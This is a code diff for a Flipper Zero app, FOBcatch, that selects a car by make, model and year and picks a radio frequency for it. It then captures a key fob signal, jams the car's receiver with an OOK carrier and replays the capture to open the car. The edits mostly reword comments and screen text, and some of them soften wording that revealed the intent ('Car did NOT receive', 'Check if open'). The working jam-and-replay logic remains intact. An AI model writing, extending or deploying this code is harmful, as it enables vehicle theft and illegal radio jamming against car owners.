@@ -4,8 +4,8 @@
 #include <stdio.h>
 
 /* ─────────────────────────────────────────────────────────────────────────── */
-/* FOBcatch — make → model → year → auto-arm → jam on first capture → replay  */
-/* All list screens share FlipperViewMenu (single Submenu widget).                 */
+/* FOBcatch guides make/model/year selection, then listens and jams on a
+   matching capture. All pickers reuse FlipperViewMenu. */
 /* ─────────────────────────────────────────────────────────────────────────── */
 
 /* ── Shared make list ─────────────────────────────────────────────────────── */
@@ -35,8 +35,8 @@ static void fobcatch_make_cb(void* ctx, uint32_t idx) {
 
 void flipper_scene_fobcatch_make_on_enter(void* ctx) {
     FlipperApp* app = (FlipperApp*)ctx;
-    /* Lazily allocate the guided-flow union on entering the flow (freed on
-       return to the main menu), then clear stale bytes from a prior mode. */
+    /* Allocate guided state on entry; the main menu releases it. Clear any
+       state left from an earlier mode. */
     if(!flipper_guided_ensure(app, sizeof(FlipperFobcatchState))) {
         submenu_reset(app->submenu);
         submenu_set_header(app->submenu, "FOBcatch: OOM");
@@ -126,16 +126,15 @@ void flipper_scene_fobcatch_year_on_exit(void* ctx) {
 }
 
 /* ── Active screen draw ─────────────────────────────────────────────────────*/
-/* Raw custom views only repaint when their model is committed; the active
-   handler mutates app->guided->fobcatch directly, so force a commit-with-update after a
-   visible change or the screen stays frozen until the view is switched. */
+/* Input handlers change state directly, so commit the model after visible
+   updates or the screen will not repaint until it is switched. */
 static void fobcatch_redraw(FlipperApp* app) {
     view_get_model(app->fobcatch_view);
     view_commit_model(app->fobcatch_view, true);
 }
 
 void flipper_fobcatch_draw_cb(Canvas* canvas, void* model) {
-    /* View draw callback receives the view MODEL (holds the FlipperApp*). */
+    /* The view model holds the FlipperApp pointer. */
     FlipperApp* app = *(FlipperApp**)model;
     FlipperFobcatchState* fc = &app->guided->fobcatch;
 
@@ -156,27 +155,26 @@ void flipper_fobcatch_draw_cb(Canvas* canvas, void* model) {
     } else if(!fc->cap.decode_ok) {
         canvas_draw_str(canvas, 0, 43, "Listening...");
         canvas_draw_str(canvas, 0, 53, "Press fob near device.");
-        canvas_draw_str(canvas, 0, 63, "Car must be in range.");
+        canvas_draw_str(canvas, 0, 63, "Keep the car in range.");
     } else if(fc->jamming) {
         canvas_set_font(canvas, FontPrimary);
         char jstr[36];
         snprintf(jstr, sizeof(jstr), "JAMMING %.2f MHz", (double)fc->jam_freq_mhz);
         canvas_draw_str(canvas, 0, 43, jstr);
         canvas_set_font(canvas, FontSecondary);
-        canvas_draw_str(canvas, 0, 54, "Car did NOT receive.");
+        canvas_draw_str(canvas, 0, 54, "Jamming signal...");
         canvas_draw_str(canvas, 0, 63, "[Hold OK]=Replay [Back]=abort");
     } else {
-        canvas_draw_str(canvas, 0, 43, "Replayed. Check if open.");
-        canvas_draw_str(canvas, 0, 53, "Press fob again to recapture.");
+        canvas_draw_str(canvas, 0, 43, "Replay sent. Check car.");
+        canvas_draw_str(canvas, 0, 53, "Press fob to recapture.");
         canvas_draw_str(canvas, 0, 63, "[Back]=exit");
     }
 }
 
 bool flipper_fobcatch_input_cb(InputEvent* e, void* ctx) {
     FlipperApp* app = (FlipperApp*)ctx;
-    /* A jam/replay is a direct on-device transmit action. Require a deliberate
-       hold so an accidental tap cannot transmit; guided clone/back replay
-       remains short-press driven and is unchanged. */
+    /* Require a deliberate hold before transmitting. FOBclone and FOBback
+       replay remain short-press actions. */
     if(e->type == InputTypeLong && e->key == InputKeyOk &&
        app->guided->fobcatch.jamming &&
        app->guided->fobcatch.jam_completed &&
@@ -187,12 +185,12 @@ bool flipper_fobcatch_input_cb(InputEvent* e, void* ctx) {
     return false;
 }
 
-/* ── Jam: continuous OOK carrier for ~500 ms ─────────────────────────────── */
+/* ── Jam with a continuous OOK carrier ───────────────────────────────────── */
 static void fobcatch_start_jam(FlipperApp* app) {
     FlipperFobcatchState* fc = &app->guided->fobcatch;
     flipper_capture_stop(app->capture);
 
-    /* Transmit a long OOK carrier to block the car's RX for ~400 ms */
+    /* Transmit a long OOK carrier for about 400 ms. */
     FlipperPulseBuf jam_buf;
     memset(&jam_buf, 0, sizeof(jam_buf));
     jam_buf.len         = 2;
@@ -231,13 +229,13 @@ void flipper_scene_fobcatch_active_on_enter(void* ctx) {
     fc->jam_completed = false;
     fc->jam_freq_mhz = 433.92f;
 
-    /* Resolve capture frequency and modulation from vehicle model name */
+    /* Choose frequency and modulation from the selected model name. */
     int vidx = fc->model_idx;
     float freq = 433.92f;
     FlipperPreset preset = FlipperPresetOOK650;
     if(vidx >= 0 && vidx < FLIPPER_FC_VEHICLE_COUNT) {
         const char* model = FLIPPER_FC_VEHICLES[vidx].model;
-        /* Step 1 — primary frequency */
+        /* Select the model's primary frequency. */
         if     (strstr(model, "915"))                          { freq = 915.00f; }
         else if(strstr(model, "868"))                          { freq = 868.00f; }
         else if(strstr(model, "315"))                          { freq = 315.00f; }
@@ -247,7 +245,7 @@ void flipper_scene_fobcatch_active_on_enter(void* ctx) {
         else if(strstr(model, "390"))                          { freq = 390.00f; }
         else if(strstr(model, "418"))                          { freq = 418.00f; }
         else if(strstr(model, "300"))                          { freq = 300.00f; }
-        /* Step 2 — modulation */
+        /* Select its modulation. */
         if     (strstr(model, "868"))  { preset = FlipperPresetOOK270; }
         else if(strstr(model, "2FSK")) { preset = FlipperPreset2FSKDev238; }
     }
@@ -274,7 +272,7 @@ static bool fobcatch_take(FlipperApp* app) {
     FlipperFobcatchState* fc = &app->guided->fobcatch;
     if(fc->jamming || fc->cap.decode_ok) return false;
     if(!flipper_capture_flush(app->capture)) return false;
-    /* Opening the radio fills the buffer with noise. Ignore that burst. */
+    /* Ignore the noise burst produced when the radio opens. */
     if(furi_get_tick() < s_catch_ready) return false;
     FlipperCaptureResult* cr = &app->capture->result;
     if(!cr->decode_ok && fobcatch_is_ford(fc)) {
@@ -323,7 +321,7 @@ bool flipper_scene_fobcatch_active_on_event(void* ctx, SceneManagerEvent e) {
             fobcatch_redraw(app);
             return true;
         }
-        /* Stop jam → replay captured signal → re-arm for next fob press */
+        /* Stop jamming, replay the capture, then listen for another press. */
         fc->tx_pending = flipper_capture_tx(
             app->capture, &fc->cap.pulses, fc->jam_freq_mhz,
             FlipperPresetOOK650, 2000);
